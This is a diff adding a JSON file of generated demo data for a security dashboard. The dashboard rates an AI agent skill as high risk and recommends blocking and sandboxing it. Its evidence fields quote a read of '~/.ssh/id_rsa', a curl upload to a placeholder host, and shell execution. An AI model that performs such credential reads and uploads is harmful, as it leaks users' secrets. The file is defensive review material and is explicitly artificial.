@@ -1,0 +1,195 @@
+{
+  "skill_name": "demo-risky-skill",
+  "analysis_mode": "demo",
+  "data_source": "generated demo data",
+  "generated_at": "2026-05-13T03:38:43.733944+00:00",
+  "level": "level3.1",
+  "risk_score": 82,
+  "risk_level": "HIGH",
+  "confidence": 0.91,
+  "reviewer_summary": {
+    "verdict": "High risk demo skill",
+    "summary": "The skill demonstrates sensitive file access, shell execution, and network behavior.",
+    "manual_review_required": true,
+    "suggested_decision": "Block or isolate before manual approval",
+    "top_risks": [
+      "Sensitive file access",
+      "Shell execution",
+      "Network connection attempt"
+    ]
+  },
+  "suggested_decision": "Block or isolate before manual approval",
+  "manual_review_required": true,
+  "top_risks": [
+    "Sensitive file access",
+    "Shell execution",
+    "Network connection attempt"
+  ],
+  "security_flags": {
+    "sensitive_file_access": true,
+    "shell_execution": true,
+    "network_attempt": true,
+    "prompt_injection_risk": false,
+    "persistence_risk": false,
+    "evasion_risk": false
+  },
+  "summary_cards": [
+    {
+      "label": "Risk Score",
+      "value": "82/100",
+      "description": "Overall risk score calculated from static and dynamic evidence."
+    },
+    {
+      "label": "Risk Level",
+      "value": "HIGH",
+      "description": "The skill shows multiple suspicious behaviors."
+    },
+    {
+      "label": "Triggered Rules",
+      "value": "7",
+      "description": "Number of security rules matched."
+    },
+    {
+      "label": "Evidence Events",
+      "value": "14",
+      "description": "Number of evidence events collected."
+    }
+  ],
+  "risk_dimensions": {
+    "static_risk": 70,
+    "dynamic_risk": 85,
+    "network_risk": 60,
+    "secret_risk": 90,
+    "persistence_risk": 50,
+    "prompt_injection_risk": 40,
+    "evasion_risk": 30
+  },
+  "timeline_events": [
+    {
+      "timestamp": "00:00.000",
+      "event_type": "start",
+      "severity": "INFO",
+      "message": "Skill execution started.",
+      "evidence": "runner invoked demo-risky-skill"
+    },
+    {
+      "timestamp": "00:00.218",
+      "event_type": "file_access",
+      "severity": "HIGH",
+      "message": "Attempted to access a sensitive file.",
+      "evidence": "open('~/.ssh/id_rsa')"
+    },
+    {
+      "timestamp": "00:00.462",
+      "event_type": "network",
+      "severity": "MEDIUM",
+      "message": "Attempted external network connection.",
+      "evidence": "curl http://example.invalid/upload"
+    },
+    {
+      "timestamp": "00:00.781",
+      "event_type": "process",
+      "severity": "HIGH",
+      "message": "Spawned a shell command.",
+      "evidence": "subprocess.run(..., shell=True)"
+    },
+    {
+      "timestamp": "00:01.000",
+      "event_type": "exit",
+      "severity": "INFO",
+      "message": "Skill execution finished.",
+      "evidence": "exit_code=0"
+    }
+  ],
+  "static_findings": [
+    {
+      "rule_id": "STATIC_SUBPROCESS_SHELL",
+      "title": "Shell execution detected",
+      "severity": "HIGH",
+      "source": "static",
+      "evidence": "subprocess.run(command, shell=True)",
+      "explanation": "The skill contains code that can execute shell commands.",
+      "recommendation": "Avoid shell=True and restrict command execution."
+    },
+    {
+      "rule_id": "STATIC_SECRET_PATH",
+      "title": "Sensitive path reference",
+      "severity": "HIGH",
+      "source": "static",
+      "evidence": "~/.ssh/id_rsa",
+      "explanation": "The skill references a common SSH private key path.",
+      "recommendation": "Block access to user secret paths during skill execution."
+    }
+  ],
+  "dynamic_findings": [
+    {
+      "rule_id": "DYNAMIC_SECRET_ACCESS",
+      "title": "Sensitive file access attempt",
+      "severity": "HIGH",
+      "source": "dynamic",
+      "evidence": "attempted read: ~/.ssh/id_rsa",
+      "explanation": "The skill attempted to access a sensitive file during execution.",
+      "recommendation": "Run skills in a sandbox with a restricted filesystem."
+    },
+    {
+      "rule_id": "DYNAMIC_NETWORK_ATTEMPT",
+      "title": "Network connection attempt",
+      "severity": "MEDIUM",
+      "source": "dynamic",
+      "evidence": "curl http://example.invalid/upload",
+      "explanation": "The skill attempted to contact an external host.",
+      "recommendation": "Disable network access by default unless explicitly required."
+    }
+  ],
+  "rule_findings": [
+    {
+      "rule_id": "STATIC_SUBPROCESS_SHELL",
+      "title": "Shell execution detected",
+      "severity": "HIGH",
+      "source": "static",
+      "evidence": "subprocess.run(command, shell=True)",
+      "explanation": "Shell execution can allow command injection or unwanted system access.",
+      "recommendation": "Replace shell execution with allowlisted commands."
+    },
+    {
+      "rule_id": "DYNAMIC_SECRET_ACCESS",
+      "title": "Sensitive file access attempt",
+      "severity": "HIGH",
+      "source": "dynamic",
+      "evidence": "attempted read: ~/.ssh/id_rsa",
+      "explanation": "Access to private keys may lead to credential leakage.",
+      "recommendation": "Deny access to SSH keys, API keys, token files, and environment secrets."
+    }
+  ],
+  "static_dynamic_comparison": [
+    {
+      "risk": "Shell execution",
+      "static_detected": true,
+      "dynamic_triggered": true,
+      "conclusion": "High confidence"
+    },
+    {
+      "risk": "Sensitive file access",
+      "static_detected": true,
+      "dynamic_triggered": true,
+      "conclusion": "High confidence"
+    },
+    {
+      "risk": "Network exfiltration",
+      "static_detected": false,
+      "dynamic_triggered": true,
+      "conclusion": "Dynamic-only finding"
+    }
+  ],
+  "recommendations": [
+    "Block this skill until manual review is completed.",
+    "Run only in a restricted sandbox.",
+    "Disable network access by default.",
+    "Deny access to SSH keys, .env files, token files, and credential stores.",
+    "Require explicit approval before enabling shell execution."
+  ],
+  "notes": [
+    "This dashboard data is demo data for level3.1 security review visualization.",
+    "Do not present this demo as a verified VM Mode C execution result."
+  ]
+}
